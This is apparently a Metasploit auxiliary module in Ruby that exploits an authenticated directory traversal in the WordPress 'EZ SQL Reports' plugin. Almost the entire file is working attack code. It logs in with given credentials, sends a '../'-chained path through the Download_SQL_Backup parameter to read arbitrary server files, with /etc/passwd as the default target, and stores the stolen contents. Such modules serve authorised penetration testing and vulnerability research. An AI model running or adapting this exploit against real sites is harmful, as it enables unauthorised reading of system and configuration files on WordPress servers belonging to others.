##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HTTP::Wordpress
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'WordPress EZ SQL Reports File Read Vulnerability',
      'Description'    => %q{
        This module exploits a authenticated directory traversal vulnerability
        in WordPress Plugin "EZ SQL Reports" version 4.11.33, allowing
        to read arbitrary files with the web server privileges.
      },
      'References'     =>
        [
          ['WPVDB', '8184'],
          ['EDB', '38176']
        ],
      'Author'         =>
        [
          'Felipe Molina', # Vulnerability Discovery
          'Roberto Soares Espreto <robertoespreto[at]gmail.com>' # Metasploit Module
        ],
      'License'        => MSF_LICENSE
    ))

    register_options(
      [
        OptString.new('WP_USER', [true, 'A valid username', nil]),
        OptString.new('WP_PASS', [true, 'Valid password for the provided username', nil]),
        OptString.new('FILEPATH', [true, 'The path to the file to read', '/etc/passwd']),
        OptInt.new('DEPTH', [ true, 'Traversal Depth (to reach the wordpress root folder)', 7 ])
      ], self.class)
  end

  def user
    datastore['WP_USER']
  end

  def password
    datastore['WP_PASS']
  end

  def check
    check_plugin_version_from_readme('elisqlreports', '4.11.37')
  end

  def run_host(ip)
    vprint_status("#{peer} - Trying to login as: #{user}")
    cookie = wordpress_login(user, password)
    if cookie.nil?
      print_error("#{peer} - Unable to login as: #{user}")
      return
    end

    traversal = '../' * datastore['DEPTH']
    filename = datastore['FILEPATH']
    filename = filename[1, filename.length] if filename =~ /^\//

    res = send_request_cgi(
      'method'                  => 'GET',
      'uri'                     => normalize_uri(wordpress_url_backend, 'admin.php'),
      'vars_get'                => {
        'page'                  => 'ELISQLREPORTS-settings',
        'Download_SQL_Backup'   => "#{traversal}#{filename}"
      },
      'cookie'                  => cookie
    )

    if res && res.code == 200 && !res.body.include?('SQL Reports - Plugin Settings')

      vprint_line("\n#{res.body}")
      fname = datastore['FILEPATH']
      path = store_loot(
        'elisqlreports.traversal',
        'text/plain',
        ip,
        res.body,
        fname
      )
      print_good("#{peer} - File saved in: #{path}")
    else
      print_error("#{peer} - Nothing was downloaded. You can try to change the FILEPATH.")
    end
  end
end
